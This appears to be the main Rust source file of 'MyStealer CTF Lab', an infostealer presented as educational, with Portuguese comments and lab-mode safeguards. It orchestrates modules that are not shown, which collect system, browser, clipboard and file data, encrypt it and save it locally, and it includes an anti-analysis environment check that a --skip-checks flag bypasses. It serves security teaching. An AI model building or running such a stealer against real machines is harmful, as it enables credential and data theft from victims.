//! MyStealer CTF Lab - Educational Infostealer
//!
//! ⚠️ AVISO: Este software é APENAS para fins educacionais.
//! Uso indevido é ILEGAL e pode resultar em consequências criminais.

use clap::Parser;
use tracing::{info, warn, error, Level};
use tracing_subscriber::FmtSubscriber;

mod config;
mod collectors;
mod crypto;
mod exfil;
mod utils;

use config::Config;
use utils::anti_analysis::EnvironmentChecker;

/// MyStealer CTF Lab - Educational Infostealer
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Executar em modo laboratório (obrigatório para segurança)
    #[arg(long, default_value_t = true)]
    lab_mode: bool,

    /// Nível de logging (trace, debug, info, warn, error)
    #[arg(short, long, default_value = "info")]
    log_level: String,

    /// Diretório de saída para dados coletados
    #[arg(short, long, default_value = "./output")]
    output_dir: String,

    /// Módulos a executar (separados por vírgula)
    #[arg(short, long, default_value = "system,browser,clipboard,files")]
    modules: String,

    /// Pular verificações de ambiente (PERIGOSO)
    #[arg(long, default_value_t = false)]
    skip_checks: bool,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let args = Args::parse();

    // Configurar logging
    let log_level = match args.log_level.to_lowercase().as_str() {
        "trace" => Level::TRACE,
        "debug" => Level::DEBUG,
        "info" => Level::INFO,
        "warn" => Level::WARN,
        "error" => Level::ERROR,
        _ => Level::INFO,
    };

    let subscriber = FmtSubscriber::builder()
        .with_max_level(log_level)
        .with_target(false)
        .with_thread_ids(false)
        .with_file(false)
        .with_line_number(false)
        .finish();

    tracing::subscriber::set_global_default(subscriber)
        .expect("Falha ao configurar logging");

    // Banner
    print_banner();

    // Verificar modo lab
    #[cfg(feature = "lab-mode")]
    {
        info!("🔬 Modo laboratório ATIVO");
        
        if !args.skip_checks {
            info!("Verificando ambiente de laboratório...");
            
            match EnvironmentChecker::verify_lab_environment() {
                Ok(true) => {
                    info!("✅ Ambiente de laboratório verificado");
                }
                Ok(false) => {
                    error!("❌ ERRO: Ambiente não parece ser um laboratório!");
                    error!("Este software deve ser executado APENAS em VMs isoladas.");
                    error!("Use --skip-checks para ignorar (PERIGOSO!)");
                    std::process::exit(1);
                }
                Err(e) => {
                    warn!("⚠️ Não foi possível verificar ambiente: {}", e);
                }
            }
        } else {
            warn!("⚠️ AVISO: Verificações de segurança DESABILITADAS!");
            warn!("⚠️ Você está por sua conta e risco!");
        }
    }

    #[cfg(not(feature = "lab-mode"))]
    {
        error!("❌ ERRO: Compilado sem modo laboratório!");
        error!("Recompile com: cargo build --features lab-mode");
        std::process::exit(1);
    }

    // Carregar configuração
    let config = Config::new(
        args.output_dir.clone(),
        args.modules.split(',').map(|s| s.trim().to_string()).collect(),
    );

    info!("Configuração carregada:");
    info!("  Output: {}", config.output_dir);
    info!("  Módulos: {:?}", config.enabled_modules);

    // Executar coleta
    info!("Iniciando coleta de dados...");
    
    let result = run_collection(&config).await;

    match result {
        Ok(data_path) => {
            info!("✅ Coleta concluída com sucesso!");
            info!("📁 Dados salvos em: {}", data_path);
        }
        Err(e) => {
            error!("❌ Erro durante coleta: {}", e);
            return Err(e);
        }
    }

    info!("MyStealer CTF Lab finalizado.");
    Ok(())
}

fn print_banner() {
    println!(r#"
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║   ███╗   ███╗██╗   ██╗███████╗████████╗███████╗ █████╗ ██╗   ║
    ║   ████╗ ████║╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║   ║
    ║   ██╔████╔██║ ╚████╔╝ ███████╗   ██║   █████╗  ███████║██║   ║
    ║   ██║╚██╔╝██║  ╚██╔╝  ╚════██║   ██║   ██╔══╝  ██╔══██║██║   ║
    ║   ██║ ╚═╝ ██║   ██║   ███████║   ██║   ███████╗██║  ██║███████╗
    ║   ╚═╝     ╚═╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝
    ║                                                              ║
    ║                    CTF LAB - Educational Only                ║
    ║                                                              ║
    ╠══════════════════════════════════════════════════════════════╣
    ║  ⚠️  AVISO: Apenas para fins educacionais em labs isolados   ║
    ╚══════════════════════════════════════════════════════════════╝
    "#);
}

async fn run_collection(config: &Config) -> anyhow::Result<String> {
    use collectors::CollectorManager;
    use crypto::CryptoManager;
    use exfil::LocalExfiltrator;

    // Criar diretório de saída
    std::fs::create_dir_all(&config.output_dir)?;

    // Inicializar gerenciador de coletores
    let mut manager = CollectorManager::new();
    
    // Registrar coletores habilitados
    for module in &config.enabled_modules {
        manager.register_module(module)?;
    }

    // Executar coleta
    info!("Executando {} coletores...", manager.collector_count());
    let collected_data = manager.run_all().await?;

    // Criptografar dados
    info!("Criptografando dados coletados...");
    let crypto = CryptoManager::new()?;
    let encrypted = crypto.encrypt(&serde_json::to_vec(&collected_data)?)?;

    // Salvar localmente (modo lab)
    let exfil = LocalExfiltrator::new(&config.output_dir);
    let output_path = exfil.save(&encrypted)?;

    // Salvar versão legível (apenas lab)
    #[cfg(feature = "lab-mode")]
    {
        let readable_path = format!("{}/collected_data_readable.json", config.output_dir);
        std::fs::write(&readable_path, serde_json::to_string_pretty(&collected_data)?)?;
        info!("📄 Versão legível salva em: {}", readable_path);
    }

    Ok(output_path)
}

